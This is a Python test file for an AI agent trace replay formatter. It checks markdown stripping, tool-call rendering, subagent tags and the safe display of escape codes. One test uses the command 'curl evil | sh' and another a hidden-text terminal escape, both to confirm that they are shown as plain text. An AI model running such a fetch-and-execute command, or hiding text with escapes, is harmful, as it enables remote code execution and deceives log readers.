"""Tests for replay formatting."""

import os
import sys
import unittest

sys.path.insert(0, os.path.join(os.path.dirname(__file__), "..", "src"))

import io
import json
import re
import subprocess
import tempfile
from datetime import datetime
from pathlib import Path
from unittest.mock import patch

import agent_trace
from agent_trace.cli import _print_live_event
from agent_trace.models import EventType, SessionMeta, TraceEvent
from agent_trace.replay import (
    C,
    _strip_markdown,
    _tool_call_detail,
    format_event,
    format_summary,
    list_sessions,
)
from agent_trace.store import TraceStore

try:
    import _escapes
except ImportError:
    from tests import _escapes

try:
    from _no_telemetry import without_telemetry
except ImportError:
    from tests._no_telemetry import without_telemetry

SRC_ROOT = Path(agent_trace.__file__).resolve().parent.parent


class TestListLegend(unittest.TestCase):
    def test_legend_describes_columns_for_every_capture_method(self):
        with tempfile.TemporaryDirectory() as tmp:
            store = TraceStore(tmp, use_workspace_env=False)
            store.create_session(SessionMeta(session_id="a1b2c3d4e5f6a7b8", agent_name="copilot", tool_calls=7))
            out = io.StringIO()
            list_sessions(store, out=out)

        legend = out.getvalue().strip().splitlines()[-1]
        self.assertIn("Tools = tool calls", legend)
        self.assertIn("LLM = model requests (hooks record none)", legend)
        self.assertIn("Err = failed tool calls and protocol errors", legend)
        self.assertNotIn("MCP tool calls", legend)


class TestStripMarkdown(unittest.TestCase):
    def test_bold(self):
        self.assertEqual(_strip_markdown("**hello**"), "hello")

    def test_italic(self):
        self.assertEqual(_strip_markdown("*hello*"), "hello")

    def test_inline_code(self):
        self.assertEqual(_strip_markdown("`code`"), "code")

    def test_link(self):
        self.assertEqual(_strip_markdown("[text](http://example.com)"), "text")

    def test_header(self):
        self.assertEqual(_strip_markdown("## Header"), "Header")

    def test_mixed(self):
        result = _strip_markdown("**75 tests**, all passing in `3.60s`.")
        self.assertEqual(result, "75 tests, all passing in 3.60s.")

    def test_multiline_collapsed(self):
        result = _strip_markdown("line one\n\nline two\nline three")
        self.assertEqual(result, "line one line two line three")

    def test_plain_text_unchanged(self):
        self.assertEqual(_strip_markdown("hello world"), "hello world")

    def test_table_stripped(self):
        table = "| File | Tests |\n|---|---|\n| test_a.py | 7 |\n| test_b.py | 25 |"
        result = _strip_markdown(table)
        self.assertNotIn("|---|", result)
        self.assertIn("test_a.py", result)
        self.assertIn("7", result)

    def test_table_separator_removed(self):
        result = _strip_markdown("|---|---|")
        self.assertEqual(result, "")

    def test_code_block_removed(self):
        result = _strip_markdown("before\n```python\nprint('hi')\n```\nafter")
        self.assertNotIn("print", result)
        self.assertIn("before", result)
        self.assertIn("after", result)

    def test_list_markers_stripped(self):
        result = _strip_markdown("- item one\n- item two\n* item three")
        self.assertIn("item one", result)
        self.assertNotIn("- ", result)
        self.assertNotIn("* ", result)

    def test_numbered_list_stripped(self):
        result = _strip_markdown("1. first\n2. second")
        self.assertIn("first", result)
        self.assertNotIn("1.", result)

    def test_multiple_spaces_collapsed(self):
        result = _strip_markdown("hello    world")
        self.assertEqual(result, "hello world")


class TestToolCallDetail(unittest.TestCase):
    def test_bash_command(self):
        result = _tool_call_detail("Bash", {"command": "npm test", "description": "run tests"})
        self.assertEqual(result, "$ npm test")

    def test_read_file(self):
        result = _tool_call_detail("Read", {"file_path": "/src/main.py"})
        self.assertEqual(result, "/src/main.py")

    def test_write_file(self):
        result = _tool_call_detail("Write", {"file_path": "/src/out.txt"})
        self.assertEqual(result, "/src/out.txt")

    def test_edit_file(self):
        result = _tool_call_detail("Edit", {"file_path": "/src/main.py", "old_string": "foo", "new_string": "bar"})
        self.assertIn("/src/main.py", result)
        self.assertIn("foo", result)

    def test_glob_pattern(self):
        result = _tool_call_detail("Glob", {"pattern": "tests/**/*.py"})
        self.assertEqual(result, "tests/**/*.py")

    def test_grep_pattern(self):
        result = _tool_call_detail("Grep", {"pattern": "TODO", "path": "/src"})
        self.assertEqual(result, "/TODO/ /src")

    def test_webfetch_url(self):
        result = _tool_call_detail("WebFetch", {"url": "https://example.com"})
        self.assertEqual(result, "https://example.com")

    def test_websearch_query(self):
        result = _tool_call_detail("WebSearch", {"query": "python async"})
        self.assertEqual(result, "python async")

    def test_agent_prompt(self):
        result = _tool_call_detail("Agent", {"prompt": "Find all API endpoints"})
        self.assertEqual(result, "Find all API endpoints")

    def test_empty_args(self):
        result = _tool_call_detail("Unknown", {})
        self.assertEqual(result, "")

    def test_long_bash_command_truncated(self):
        cmd = "x" * 200
        result = _tool_call_detail("Bash", {"command": cmd})
        self.assertIn("...", result)
        self.assertLess(len(result), 130)

    def test_mcp_tool_fallback(self):
        result = _tool_call_detail("mcp__custom_tool", {"query": "SELECT * FROM users"})
        self.assertEqual(result, "query: SELECT * FROM users")


class TestFormatEvent(unittest.TestCase):
    def test_tool_call_shows_detail(self):
        event = TraceEvent(
            event_type=EventType.TOOL_CALL,
            session_id="test",
            data={"tool_name": "Bash", "arguments": {"command": "ls -la"}},
        )
        output = format_event(event, base_ts=event.timestamp)
        self.assertIn("Bash", output)
        self.assertIn("$ ls -la", output)

    def test_tool_result_shows_name_and_preview(self):
        event = TraceEvent(
            event_type=EventType.TOOL_RESULT,
            session_id="test",
            data={"tool_name": "Bash", "result": "file1.py\nfile2.py\nfile3.py"},
            duration_ms=42,
        )
        output = format_event(event, base_ts=event.timestamp)
        self.assertIn("Bash", output)
        self.assertIn("42ms", output)
        self.assertIn("file1.py", output)

    def test_error_shows_message(self):
        event = TraceEvent(
            event_type=EventType.ERROR,
            session_id="test",
            data={"tool_name": "Bash", "error": "Command failed with exit code 1"},
        )
        output = format_event(event, base_ts=event.timestamp)
        self.assertIn("Bash", output)
        self.assertIn("Command failed", output)

    def test_error_shows_message_key(self):
        event = TraceEvent(
            event_type=EventType.ERROR,
            session_id="test",
            data={"message": "Connection refused"},
        )
        output = format_event(event, base_ts=event.timestamp)
        self.assertIn("Connection refused", output)

    def test_assistant_response_strips_markdown(self):
        event = TraceEvent(
            event_type=EventType.ASSISTANT_RESPONSE,
            session_id="test",
            data={"text": "**75 tests**, all passing in `3.60s`."},
        )
        output = format_event(event, base_ts=event.timestamp)
        self.assertIn("75 tests", output)
        self.assertNotIn("**", output)
        self.assertNotIn("`", output)

    def test_user_prompt_shows_text(self):
        event = TraceEvent(
            event_type=EventType.USER_PROMPT,
            session_id="test",
            data={"prompt": "Fix the login bug"},
        )
        output = format_event(event, base_ts=event.timestamp)
        self.assertIn("Fix the login bug", output)


class TestSubagentAttribution(unittest.TestCase):
    AGENT = "d0000011-0000-4000-8000-000000000011"
    TAG = "[subagent default 00000011]"

    def event(self, event_type, attributed=True, **data):
        if attributed:
            data.update(agent_id=self.AGENT, agent_type="default")
        return TraceEvent(event_type=event_type, session_id="test", timestamp=0.0, data=data)

    def render(self, event):
        return format_event(event, base_ts=0.0)

    def tool_events(self, attributed):
        return [
            self.event(EventType.TOOL_CALL, attributed, tool_name="Bash",
                       arguments={"command": "echo synthetic"}),
            self.event(EventType.TOOL_RESULT, attributed, tool_name="Bash", result="synthetic"),
            self.event(EventType.ERROR, attributed, tool_name="Bash", error="exit code 1"),
        ]

    def test_tool_events_carry_the_subagent_tag(self):
        for event in self.tool_events(attributed=True):
            with self.subTest(event=event.event_type.value):
                self.assertIn(f"Bash{C.RESET} {C.MAGENTA}{self.TAG}{C.RESET}", self.render(event))

    def test_tag_without_agent_type_uses_the_short_id(self):
        event = self.event(EventType.TOOL_CALL, attributed=False, tool_name="Bash",
                           arguments={"command": "true"}, agent_id=self.AGENT)
        self.assertIn("[subagent 00000011]", self.render(event))

    def test_unattributed_tool_events_render_as_before(self):
        for attributed, plain in zip(
            self.tool_events(attributed=True), self.tool_events(attributed=False)
        ):
            with self.subTest(event=plain.event_type.value):
                tagged = self.render(attributed)
                self.assertNotIn("[subagent", self.render(plain))
                self.assertEqual(
                    tagged.replace(f" {C.MAGENTA}{self.TAG}{C.RESET}", ""), self.render(plain)
                )

    def test_subagent_start_and_stop_show_the_agent_id(self):
        for event_type in (EventType.SUBAGENT_START, EventType.SUBAGENT_STOP):
            with self.subTest(event=event_type.value):
                output = self.render(self.event(event_type))
                self.assertIn(f"agent={self.AGENT}", output)
                self.assertNotIn("returned:", output)

    def test_subagent_stop_shows_what_the_subagent_returned(self):
        output = self.render(self.event(
            EventType.SUBAGENT_STOP, text="Synthetic   subagent\nanswer.", stop_reason="done"
        ))
        first, second = output.split("\n")
        self.assertIn(f"agent={self.AGENT}", first)
        self.assertIn("(done)", first)
        self.assertIn('returned: "Synthetic subagent answer."', second)

    def test_returned_preview_is_truncated(self):
        output = self.render(self.event(EventType.SUBAGENT_STOP, text="x" * 250))
        self.assertIn('returned: "' + "x" * 200 + '..."', output)

    def test_unattributed_subagent_events_render_as_before(self):
        for event_type in (EventType.SUBAGENT_START, EventType.SUBAGENT_STOP):
            with self.subTest(event=event_type.value):
                output = self.render(self.event(
                    event_type, attributed=False, agent_type="explore",
                    child_session_id="child", stop_reason="end_turn",
                ))
                self.assertTrue(output.endswith(
                    f"{C.WHITE}explore{C.RESET} {C.DIM}child=child{C.RESET} "
                    f"{C.DIM}(end_turn){C.RESET}"
                ))
                self.assertNotIn("agent=", output)
                self.assertNotIn("returned:", output)
                self.assertNotIn("\n", output)



class TestLlmResponseStatus(unittest.TestCase):
    def render(self, **data):
        event = TraceEvent(
            event_type=EventType.LLM_RESPONSE, session_id="test", timestamp=0.0, data=data
        )
        return format_event(event, base_ts=0.0)

    def test_completed_response_renders_as_before(self):
        self.assertEqual(
            self.render(total_tokens=5, status="completed"),
            self.render(total_tokens=5),
        )

    def test_failed_response_shows_status_and_error(self):
        output = self.render(status="failed", error="synthetic\n  upstream   error")
        self.assertIn(f"{C.RED}failed{C.RESET}", output)
        self.assertIn(f"{C.DIM}synthetic upstream error{C.RESET}", output)

    def test_error_is_truncated(self):
        output = self.render(status="failed", error="x" * 200)
        self.assertIn(f"{C.DIM}{'x' * 80}{C.RESET}", output)
        self.assertNotIn("x" * 81, output)

    def test_cancelled_response_without_error(self):
        output = self.render(status="cancelled", error=None)
        self.assertIn(f"{C.RED}cancelled{C.RESET}", output)
        self.assertNotIn("None", output)

    def test_subagent_response_carries_the_tag(self):
        output = self.render(
            total_tokens=5,
            agent_id="d0000011-0000-4000-8000-000000000011",
            agent_type="default",
        )
        self.assertIn(
            f"{C.DIM}(5 tokens){C.RESET} {C.MAGENTA}[subagent default 00000011]{C.RESET}",
            output,
        )


E = EventType


def _event(event_type, **data):
    return TraceEvent(event_type=event_type, session_id="s", timestamp=0.0, data=data)


def _call(tool_name, arguments, **data):
    return _event(E.TOOL_CALL, tool_name=tool_name, arguments=arguments, **data)


def _meta(**fields):
    return SessionMeta(session_id="s", started_at=0.0, **fields)


# (label, kind, build): build(value) returns an event with value in the place
# the label names. The kinds are in tests/_escapes.py.
FORMAT_EVENT_CASES = [
    ("tool_call tool_name", "text", lambda v: _call(v, {"command": "plain"})),
    ("Bash command", "text", lambda v: _call("Bash", {"command": v})),
    ("Read file_path", "text", lambda v: _call("Read", {"file_path": v})),
    ("Write file_path", "text", lambda v: _call("Write", {"file_path": v})),
    ("Edit file_path", "text", lambda v: _call("Edit", {"file_path": v, "old_string": "plain"})),
    ("Edit old_string", "free", lambda v: _call("Edit", {"file_path": "plain", "old_string": v})),
    ("Glob pattern", "text", lambda v: _call("Glob", {"pattern": v})),
    ("Grep pattern", "text", lambda v: _call("Grep", {"pattern": v, "path": "plain"})),
    ("Grep path", "text", lambda v: _call("Grep", {"pattern": "plain", "path": v})),
    ("WebFetch url", "text", lambda v: _call("WebFetch", {"url": v})),
    ("WebSearch query", "text", lambda v: _call("WebSearch", {"query": v})),
    ("Agent prompt", "free", lambda v: _call("Agent", {"prompt": v})),
    ("MCP argument value", "text", lambda v: _call("mcp__srv__fetch", {"q": v})),
    ("MCP argument name", "text", lambda v: _call("mcp__srv__fetch", {v: "plain"})),
    ("argument names", "text", lambda v: _call("mcp__srv__fetch", {v: 1})),
    ("subagent tag agent_type", "text",
     lambda v: _call("Bash", {"command": "plain"}, agent_id="plain", agent_type=v)),
    ("subagent tag agent_id", "short", lambda v: _call("Bash", {"command": "plain"}, agent_id=v)),
    ("tool_result tool_name", "text", lambda v: _event(E.TOOL_RESULT, tool_name=v, result="plain")),
    ("tool_result content_types", "text",
     lambda v: _event(E.TOOL_RESULT, tool_name="plain", content_types=[v], result="plain")),
    ("tool_result result", "free", lambda v: _event(E.TOOL_RESULT, tool_name="plain", result=v)),
    ("tool_result content_preview", "free",
     lambda v: _event(E.TOOL_RESULT, tool_name="plain", content_preview=v)),
    ("llm_request model", "text", lambda v: _event(E.LLM_REQUEST, model=v, message_count=1)),
    ("llm_request message_count", "text",
     lambda v: _event(E.LLM_REQUEST, model="plain", message_count=v)),
    ("llm_response total_tokens", "text", lambda v: _event(E.LLM_RESPONSE, total_tokens=v)),
    ("llm_response error", "free",
     lambda v: _event(E.LLM_RESPONSE, total_tokens=5, status="failed", error=v)),
    ("file_read uri", "text", lambda v: _event(E.FILE_READ, uri=v)),
    ("file_write uri", "text", lambda v: _event(E.FILE_WRITE, uri=v)),
    ("error tool_name", "text", lambda v: _event(E.ERROR, tool_name=v, code="plain", message="plain")),
    ("error code", "text", lambda v: _event(E.ERROR, tool_name="plain", code=v, message="plain")),
    ("error message", "free", lambda v: _event(E.ERROR, tool_name="plain", code="plain", message=v)),
    ("error error", "free", lambda v: _event(E.ERROR, tool_name="plain", error=v)),
    ("session_start command", "text", lambda v: _event(E.SESSION_START, command=["plain", v])),
    ("session_end exit_code", "text", lambda v: _event(E.SESSION_END, exit_code=v)),
    ("decision choice", "text", lambda v: _event(E.DECISION, choice=v, reason="plain")),
    ("decision reason", "free", lambda v: _event(E.DECISION, choice="plain", reason=v)),
    ("user_prompt prompt", "free", lambda v: _event(E.USER_PROMPT, prompt=v)),
    ("assistant_response text", "free", lambda v: _event(E.ASSISTANT_RESPONSE, text=v)),
    ("subagent_start agent_type", "text",
     lambda v: _event(E.SUBAGENT_START, agent_type=v, child_session_id="plain", agent_id="plain")),
    ("subagent_start agent_name", "text",
     lambda v: _event(E.SUBAGENT_START, agent_name=v, child_session_id="plain")),
    ("subagent_start child_session_id", "text",
     lambda v: _event(E.SUBAGENT_START, agent_type="plain", child_session_id=v, agent_id="plain")),
    ("subagent_start agent_id", "text",
     lambda v: _event(E.SUBAGENT_START, agent_type="plain", child_session_id="plain", agent_id=v)),
    ("subagent_stop stop_reason", "text",
     lambda v: _event(E.SUBAGENT_STOP, agent_type="plain", stop_reason=v, text="plain")),
    ("subagent_stop text", "free",
     lambda v: _event(E.SUBAGENT_STOP, agent_type="plain", stop_reason="plain", text=v)),
]

FORMAT_SUMMARY_CASES = [
    ("command", "text", lambda v: _meta(command=v, agent_name="plain")),
    ("agent_name", "text", lambda v: _meta(command="plain", agent_name=v)),
]

# (label, cut, build): format_event keeps cut characters of the value the
# label names, the last ones for an agent ID.
FORMAT_EVENT_CUTS = [
    ("Bash command", 120, lambda v: _call("Bash", {"command": v})),
    ("Edit old_string", 60, lambda v: _call("Edit", {"file_path": "plain", "old_string": v})),
    ("Agent prompt", 120, lambda v: _call("Agent", {"prompt": v})),
    ("subagent tag agent_id", 8, lambda v: _call("Bash", {"command": "plain"}, agent_id=v)),
    ("tool_result result", 120, lambda v: _event(E.TOOL_RESULT, tool_name="plain", result=v)),
    ("tool_result content_preview", 120,
     lambda v: _event(E.TOOL_RESULT, tool_name="plain", content_preview=v)),
    ("llm_response error", 80,
     lambda v: _event(E.LLM_RESPONSE, total_tokens=5, status="failed", error=v)),
    ("error message", 150, lambda v: _event(E.ERROR, tool_name="plain", code="plain", message=v)),
    ("error error", 150, lambda v: _event(E.ERROR, tool_name="plain", error=v)),
    ("decision reason", 120, lambda v: _event(E.DECISION, choice="plain", reason=v)),
    ("user_prompt prompt", 150, lambda v: _event(E.USER_PROMPT, prompt=v)),
    ("assistant_response text", 200, lambda v: _event(E.ASSISTANT_RESPONSE, text=v)),
    ("subagent_stop text", 200,
     lambda v: _event(E.SUBAGENT_STOP, agent_type="plain", stop_reason="plain", text=v)),
]


class TestTraceTextShowsAsText(unittest.TestCase):
    """A tool output, a command or a tool name in a trace can hold escape
    codes and line breaks. replay and record -v show them as text, inside
    the formatter's own colors."""

    def render(self, event):
        return format_event(event, base_ts=0.0)

    def test_each_event_value_shows_escapes_as_text(self):
        _escapes.check_each_value(self, FORMAT_EVENT_CASES, self.render)

    def test_each_summary_value_shows_escapes_as_text(self):
        _escapes.check_each_value(self, FORMAT_SUMMARY_CASES, format_summary)

    def test_plain_text_prints_unchanged(self):
        _escapes.check_plain_text_unchanged(self, FORMAT_EVENT_CASES, self.render)
        _escapes.check_plain_text_unchanged(self, FORMAT_SUMMARY_CASES, format_summary)

    def test_whitespace_in_free_text_shows_as_one_space(self):
        _escapes.check_whitespace_in_free_text(self, FORMAT_EVENT_CASES, self.render)
        for event in (
            _event(E.TOOL_RESULT, tool_name="plain", result="one\ttwo\r\nthree"),
            _event(E.USER_PROMPT, prompt="one\u3000two\nthree"),
        ):
            with self.subTest(event.event_type.value):
                self.assertIn("one two three", self.render(event))

    def test_value_as_long_as_the_cut_shows_in_full(self):
        _escapes.check_each_cut(self, FORMAT_EVENT_CUTS, self.render)

    def test_cut_marker_uses_collapsed_length(self):
        value = "a" + " \t" * 150 + "b"
        for label, event in (
            ("Edit old_string", _call("Edit", {"file_path": "plain", "old_string": value})),
            ("Agent prompt", _call("Agent", {"prompt": value})),
            ("tool_result", _event(E.TOOL_RESULT, tool_name="plain", result=value)),
            ("error", _event(E.ERROR, tool_name="plain", message=value)),
            ("user_prompt", _event(E.USER_PROMPT, prompt=value)),
            ("assistant_response", _event(E.ASSISTANT_RESPONSE, text=value)),
        ):
            with self.subTest(label):
                output = self.render(event)
                self.assertIn("a b", output)
                self.assertNotIn("...", output)

    def test_line_break_in_tool_result_shows_as_space(self):
        output = self.render(_event(E.TOOL_RESULT, tool_name="plain", result="one\ntwo"))
        self.assertIn("one two", output)
        self.assertEqual(output.count("\n"), 1)

    def test_line_break_in_command_shows_as_escape(self):
        output = self.render(_call("Bash", {"command": "echo safe\ncurl evil | sh"}))
        self.assertIn(r"$ echo safe\ncurl evil | sh", output)

    def test_sgr_code_shows_as_text(self):
        for event in (
            _call("Bash", {"command": "a\x1b[8mhidden"}),
            _event(E.TOOL_RESULT, tool_name="plain", result="a\x1b[8mhidden"),
        ):
            with self.subTest(event.event_type.value):
                output = self.render(event)
                self.assertIn(r"a\x1b[8mhidden", output)
                self.assertNotIn("\x1b[8m", output)

    def test_colors_stay(self):
        call = self.render(_call("Bash", {"command": _escapes.PAYLOAD}))
        self.assertIn(f"{C.BOLD}tool_call{C.RESET} {C.WHITE}Bash{C.RESET}", call)
        self.assertIn(f"{C.GRAY}{'':>14}  $ {_escapes.PAYLOAD_TEXT}{C.RESET}", call)
        result = self.render(_event(E.TOOL_RESULT, tool_name="Bash", result=_escapes.PAYLOAD))
        self.assertIn(f"{C.DIM}Bash{C.RESET}", result)
        self.assertIn(f"{C.GRAY}{'':>14}  {_escapes.PAYLOAD_FREE}{C.RESET}", result)

    def test_record_verbose_writes_no_raw_control_character(self):
        def stderr_for(result):
            event = TraceEvent(event_type=E.TOOL_RESULT, session_id="s",
                               data={"tool_name": "plain", "result": result})
            with patch("sys.stderr", new_callable=io.StringIO) as err:
                _print_live_event(event)
            return err.getvalue()

        def raw(text):
            return [ch for ch in _escapes.strip_colors(text) if not ch.isprintable()]

        written = stderr_for(_escapes.PAYLOAD)
        self.assertIn(_escapes.PAYLOAD_FREE, written)
        self.assertEqual(raw(written), raw(stderr_for("plain")))


LIST_SESSION = "e5c0000000000004"


def _list_text(fields):
    """Return what list_sessions writes for a session whose meta.json holds
    *fields*."""
    with tempfile.TemporaryDirectory() as tmp:
        store = TraceStore(tmp, use_workspace_env=False)
        store.create_session(SessionMeta(session_id=LIST_SESSION))
        path = store._session_dir(LIST_SESSION) / "meta.json"
        meta = json.loads(path.read_text(encoding="utf-8"))
        meta.update(fields)
        path.write_text(json.dumps(meta), encoding="utf-8")
        out = io.StringIO()
        list_sessions(store, out=out)
        return out.getvalue()


MISSING = "\u2014"
STARTED = 1_780_000_000.0

# (label, value): stored started_at or ended_at values that are not a usable
# time. 1e12 is past year 9999. 1e17 makes fromtimestamp raise OSError on macOS.
UNUSABLE_TIMES = [
    ("text", "x"),
    ("bool", True),
    ("NaN", float("nan")),
    ("infinity", float("inf")),
    ("400 digits", 10 ** 400),
    ("1e12", 1e12),
    ("1e17", 1e17),
    ("negative", -5),
]

# (label, value): stored total_duration_ms values that are not a usable number.
UNUSABLE_NUMBERS = [
    ("text", "x"),
    ("bool", True),
    ("NaN", float("nan")),
    ("infinity", float("inf")),
    ("400 digits", 10 ** 400),
    ("negative", -5),
]

# (label, value): stored count values that are not a usable count.
UNUSABLE_COUNTS = UNUSABLE_NUMBERS + [
    ("escape codes", _escapes.PAYLOAD),
    ("2.5", 2.5),
    ("object", {"n": 1}),
]


def _session_line(output):
    """Return the one line of list output for LIST_SESSION."""
    [line] = [line for line in output.splitlines() if LIST_SESSION in line]
    return line


def _no_local_time(error):
    """Return a datetime class whose astimezone() raises *error*."""

    class NoLocalTime(datetime):
        def astimezone(self, tz=None):
            raise error("no local time")

    return NoLocalTime


class TestUnusableMetaValuesShowAsMissing(unittest.TestCase):
    """stats and list show a stored time or duration they cannot use as the
    missing marker, and a count they cannot use as 0."""

    def test_counts(self):
        for field in ("tool_calls", "llm_requests", "errors"):
            for label, value in UNUSABLE_COUNTS:
                with self.subTest(field=field, value=label):
                    summary = format_summary(SessionMeta(session_id="s", **{field: value}))
                    self.assertIn(
                        "\n  Tool calls: 0\n  LLM reqs:   0\n  Errors:     0\n", summary
                    )
                    line = _session_line(_list_text({field: value}))
                    self.assertTrue(
                        line.endswith(f"      0     0 {C.DIM}   0{C.RESET}"), ascii(line)
                    )

    def test_counts_print_as_before(self):
        fields = {"tool_calls": 7, "llm_requests": 3, "errors": 2}
        summary = format_summary(SessionMeta(session_id="s", **fields))
        self.assertIn("\n  Tool calls: 7\n  LLM reqs:   3\n  Errors:     2\n", summary)
        line = _session_line(_list_text(fields))
        self.assertTrue(line.endswith(f"      7     3 {C.RED}   2{C.RESET}"), ascii(line))

    def test_started_at(self):
        for label, value in UNUSABLE_TIMES:
            with self.subTest(label):
                summary = format_summary(SessionMeta(session_id="s", started_at=value))
                self.assertIn(f"\n  Started:    {MISSING}\n  Duration:   {MISSING}\n", summary)
                line = _session_line(_list_text({"started_at": value}))
                self.assertTrue(
                    line.startswith(
                        f"  {LIST_SESSION:<18} {MISSING:<26} {C.DIM}{MISSING:>9} {C.RESET} "
                    ),
                    ascii(line),
                )

    def test_duration(self):
        for field, cases in (("total_duration_ms", UNUSABLE_NUMBERS), ("ended_at", UNUSABLE_TIMES)):
            for label, value in cases:
                with self.subTest(field=field, value=label):
                    fields = {"started_at": STARTED, field: value}
                    summary = format_summary(SessionMeta(session_id="s", **fields))
                    self.assertIn(f"\n  Duration:   {MISSING}\n", summary)
                    line = _session_line(_list_text(fields))
                    self.assertIn(f" {C.DIM}{MISSING:>9} {C.RESET} ", line)

    def test_time_without_a_local_form(self):
        # astimezone() can raise for a time that fromtimestamp() accepts.
        fields = {"started_at": STARTED, "ended_at": STARTED + 2.5}
        for error in (OverflowError, ValueError, OSError):
            with self.subTest(error.__name__), patch(
                "agent_trace.replay.datetime", _no_local_time(error)
            ):
                summary = format_summary(SessionMeta(session_id="s", **fields))
                self.assertIn(f"\n  Started:    {MISSING}\n  Duration:   2.50s\n", summary)
                line = _session_line(_list_text(fields))
                self.assertTrue(
                    line.startswith(f"  {LIST_SESSION:<18} {MISSING:<26} {2.5:>9.1f}s "),
                    ascii(line),
                )


# Each meta.json as POST /sessions stored it before it checked the metadata:
# a after its updates, b to g as created.
OLD_SERVER_METAS = {
    "a" * 16: {
        "started_at": STARTED, "agent_name": "x", "attribution": "me", "zzz": 1,
        "tenant_id": "t2", "tool_calls": "lots", "ended_at": "soon", "depth": True,
    },
    "b" * 16: {"started_at": "x", "attribution": {}},
    "c" * 16: {"started_at": float("nan"), "attribution": {}},
    "d" * 16: {"started_at": float("inf"), "attribution": {}},
    "e" * 16: {"started_at": 5.0, "attribution": {}, "_unknown_fields": {"tenant_id": "t9"}},
    "f" * 16: {"started_at": 10 ** 400, "attribution": {}},
    "g" * 16: {"started_at": 5.0, "total_duration_ms": 10 ** 400, "attribution": {}},
}


class TestCliReadsMetasOlderServersStored(unittest.TestCase):
    """list and stats read each meta.json that older servers stored."""

    def test_list_and_stats_exit_0(self):
        env = without_telemetry({
            key: value
            for key, value in os.environ.items()
            if not key.startswith("AGENT_STRACE_") and key != "AGENT_TRACE_DIR"
        })
        env["PYTHONPATH"] = os.pathsep.join(
            item for item in (str(SRC_ROOT), env.get("PYTHONPATH", "")) if item
        )
        env["PYTHONIOENCODING"] = "utf-8"
        with tempfile.TemporaryDirectory() as tmp:
            store = TraceStore(tmp, use_workspace_env=False)
            for session_id, fields in OLD_SERVER_METAS.items():
                store.create_session(SessionMeta(session_id=session_id))
                path = store._session_dir(session_id) / "meta.json"
                path.write_text(json.dumps({"session_id": session_id, **fields}), encoding="utf-8")

            def run(*args):
                result = subprocess.run(
                    [sys.executable, "-m", "agent_trace.entry", "--trace-dir", tmp, *args],
                    capture_output=True,
                    text=True,
                    encoding="utf-8",
                    env=env,
                    timeout=120,
                )
                self.assertEqual(result.returncode, 0, result.stdout + result.stderr)
                return result.stdout

            # Newest first. An unusable started_at sorts as 0, and a tie sorts
            # by descending session ID.
            self.assertEqual(
                re.findall(r"\b[a-g]{16}\b", run("list")),
                [letter * 16 for letter in "agefdcb"],
            )
            for session_id in OLD_SERVER_METAS:
                with self.subTest(session_id[0]):
                    run("stats", session_id)


if __name__ == "__main__":
    unittest.main()
